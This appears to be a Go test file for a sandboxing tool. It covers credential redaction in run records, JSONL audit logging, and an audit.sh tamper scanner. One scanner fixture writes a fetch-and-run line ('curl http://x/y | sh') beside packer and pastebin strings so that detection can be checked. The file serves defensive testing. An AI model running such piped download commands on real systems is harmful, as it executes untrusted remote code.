package main

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"
)

// Two things share the word "audit" in this repo and they are not the same
// thing: the run record the jail writes (JSON lines, redacted), and audit.sh,
// the threat sweep that scores this tree. Both are tested here because both
// are named audit; the banner is where one ends and the other begins.

// ---- the run record ---------------------------------------------------------

func TestRedactArgvKeepsCredentialsOutOfTheRecord(t *testing.T) {
	// A run record is a file that outlives the run. `--token abc123` on a
	// command line is exactly the sort of thing that ends up in one and is
	// never thought about again.
	for _, tc := range []struct {
		name string
		in   []string
		want []string
	}{
		{
			"inline value after =",
			[]string{"gh", "--token=ghp_averyrealtokenvalue"},
			[]string{"gh", "--token=<redacted>"},
		},
		{
			"value in the next argument",
			[]string{"deploy", "--api-key", "sk-live-1234", "--region", "eu-west-1"},
			[]string{"deploy", "--api-key", "<redacted>", "--region", "eu-west-1"},
		},
		{
			// Deliberately not shaped like a real provider's token. The rule
			// under test is length and alphabet, not a vendor prefix, and a
			// fixture that looks like a GitHub PAT trips the repo's own
			// gitleaks scan — a fake secret failing the secret scan teaches
			// people to ignore it.
			"a bare token-shaped value nobody named",
			[]string{"curl", "-H", "not_a_real_token_0000000000000000000000"},
			[]string{"curl", "-H", "<redacted>"},
		},
		{
			"ordinary arguments are left alone",
			[]string{"npm", "run", "build", "--", "--watch"},
			[]string{"npm", "run", "build", "--", "--watch"},
		},
		{
			"a path is not a secret, however long",
			[]string{"cat", "/home/someone/projects/thing/src/main.go"},
			[]string{"cat", "/home/someone/projects/thing/src/main.go"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := redactArgv(tc.in)
			if !slices.Equal(got, tc.want) {
				t.Errorf("redactArgv(%q) = %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}

func TestRedactionErrsTowardsRedacting(t *testing.T) {
	// This is a heuristic and cannot be complete. A record that says
	// <redacted> where a harmless argument was is a mild annoyance; the other
	// mistake is a credential on disk.
	for _, arg := range []string{
		"--password", "--secret", "--AUTH-TOKEN", "--credential-file",
	} {
		got := redactArgv([]string{"tool", arg, "whatever"})
		if got[2] != "<redacted>" {
			t.Errorf("%s did not redact its value: %q", arg, got)
		}
	}
}

func TestEnvNamesRecordsNamesAndNeverValues(t *testing.T) {
	t.Setenv("AZKABAN_TEST_TOKEN", "sk-do-not-write-this-down")
	got := envNames([]string{"AZKABAN_TEST_TOKEN", "AZKABAN_TEST_ABSENT"})

	if !slices.Equal(got, []string{"AZKABAN_TEST_TOKEN"}) {
		t.Fatalf("envNames = %q, want just the one that is set", got)
	}
	// The whole point: "this run could see that variable" is useful, and the
	// value is the half that must never reach a file.
	for _, name := range got {
		if strings.Contains(name, "sk-do-not-write-this-down") {
			t.Fatal("a value leaked into the record")
		}
	}
}

func TestAuditWritesOneJSONLineAnEventAndClosesWithAnExit(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XDG_STATE_HOME", dir)

	a := startAudit(true, time.Now())
	if a == nil {
		t.Fatal("startAudit returned nil with a writable state dir")
	}
	a.event("start", map[string]any{"argv": []string{"echo", "hi"}})
	a.close(3)

	files, _ := filepath.Glob(filepath.Join(dir, "azkaban", "audit", "*.jsonl"))
	if len(files) != 1 {
		t.Fatalf("want one record file, got %d", len(files))
	}
	data, err := os.ReadFile(files[0])
	if err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) != 2 {
		t.Fatalf("want start + exit, got %d lines", len(lines))
	}
	// Every line has to parse on its own — that is the whole reason it is JSONL
	// rather than one document: a run killed mid-write leaves a readable file.
	var last map[string]any
	for _, l := range lines {
		var rec map[string]any
		if err := json.Unmarshal([]byte(l), &rec); err != nil {
			t.Fatalf("line is not valid JSON: %v\n%s", err, l)
		}
		if rec["t"] == nil || rec["event"] == nil {
			t.Errorf("line missing t or event: %s", l)
		}
		last = rec
	}
	if last["event"] != "exit" {
		t.Errorf("last event is %v, want exit", last["event"])
	}
	if last["code"].(float64) != 3 {
		t.Errorf("exit code = %v, want 3", last["code"])
	}
}

func TestANilAuditorIsAWorkingNoOp(t *testing.T) {
	// Every call site is unconditional, so --no-audit has to cost exactly one
	// nil check rather than an `if` around each of a dozen calls.
	var a *auditor
	a.event("start", map[string]any{"x": 1})
	a.degraded("what", "detail") // still prints; must not panic
	a.close(0)
}

func TestAuditIsOffWhenAskedAndOnOtherwise(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XDG_STATE_HOME", dir)

	if a := startAudit(false, time.Now()); a != nil {
		t.Error("startAudit(false) opened a file")
	}
	if files, _ := filepath.Glob(filepath.Join(dir, "azkaban", "audit", "*")); len(files) != 0 {
		t.Error("a disabled recorder still created files")
	}
}

func TestConfigCanTurnTheRecordOffAndATypoCannot(t *testing.T) {
	if !parseUserBinds("audit off\n").auditOff {
		t.Error("`audit off` did not turn the record off")
	}
	// A mistake has to fail in the direction of still recording.
	for _, line := range []string{"audit no\n", "audit 0\n", "audit\n", "audit ON\n"} {
		if parseUserBinds(line).auditOff {
			t.Errorf("%q turned the record off; only `audit off` should", line)
		}
	}
}

// ---- audit.sh ---------------------------------------------------------------

// runAudit - Runs audit.sh against one file and returns its output and exit
// code. audit.sh is the only part of this repo that is not Go, and it scores a
// verdict the same way the filter does: an exit code a human acts on.
func runAudit(t *testing.T, target string) (string, int) {
	t.Helper()
	cmd := exec.Command("./audit.sh", target)
	out, err := cmd.CombinedOutput()
	code := 0
	if ee, ok := err.(*exec.ExitError); ok {
		code = ee.ExitCode()
	} else if err != nil {
		t.Fatalf("running audit.sh %s: %v", target, err)
	}
	return string(out), code
}

// TestAuditBinary_VerdictFollowsTamperSignals - A file with no tamper signal
// exits 0, a file carrying packer magic and C2 strings exits 1 and names each
// signal. The exit code is what `make audit` and any CI wrapper reads, so it is
// checked alongside the text.
func TestAuditBinary_VerdictFollowsTamperSignals(t *testing.T) {
	dir := t.TempDir()
	clean := filepath.Join(dir, "clean")
	if err := os.WriteFile(clean, []byte("nothing interesting in this file at all\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	dirty := filepath.Join(dir, "dirty")
	if err := os.WriteFile(dirty, []byte("UPX!\nreach us at pastebin.com\ncurl http://x/y | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	out, code := runAudit(t, clean)
	if code != 0 {
		t.Errorf("clean file: exit %d, want 0\n%s", code, out)
	}
	if !strings.Contains(out, "NO TAMPER SIGNALS") {
		t.Errorf("clean file: verdict missing from output\n%s", out)
	}

	out, code = runAudit(t, dirty)
	if code != 1 {
		t.Errorf("tampered file: exit %d, want 1\n%s", code, out)
	}
	for _, want := range []string{"packed (UPX)", "pastebin", "curl", "SUSPICIOUS"} {
		if !strings.Contains(out, want) {
			t.Errorf("tampered file: %q missing from output\n%s", want, out)
		}
	}
}

// TestAuditBinary_AppendedPayloadIsFlagged - The self-extractor trick: bytes
// living past the end of the ELF section-header table. Reconstructing where the
// file ought to end is arithmetic over three readelf fields, and getting one
// wrong turns the check off silently rather than making it fail — so it needs a
// case of its own. The fixture is a borrowed system ELF audited twice, clean and
// then with a payload glued on, so the verdict has to come from the arithmetic
// and not from anything else in the file. Never the test binary: that one
// carries these very check strings and would match itself.
func TestAuditBinary_AppendedPayloadIsFlagged(t *testing.T) {
	if _, err := exec.LookPath("readelf"); err != nil {
		t.Skip("no readelf on this host; the ELF arithmetic cannot run")
	}
	elf, err := os.ReadFile("/bin/true")
	if err != nil {
		t.Skip("no /bin/true to borrow as an ELF fixture: " + err.Error())
	}
	fixture := filepath.Join(t.TempDir(), "fixture")
	if err := os.WriteFile(fixture, elf, 0o755); err != nil {
		t.Fatal(err)
	}
	if out, code := runAudit(t, fixture); code != 0 {
		t.Skipf("borrowed ELF is not clean on this host (exit %d); nothing to compare against\n%s", code, out)
	}

	if err := os.WriteFile(fixture, append(elf, make([]byte, 8192)...), 0o755); err != nil {
		t.Fatal(err)
	}
	out, code := runAudit(t, fixture)
	if code != 1 {
		t.Errorf("ELF with 8K glued on: exit %d, want 1\n%s", code, out)
	}
	if !strings.Contains(out, "after section headers") {
		t.Errorf("ELF with 8K glued on: appended-data signal missing\n%s", out)
	}
}
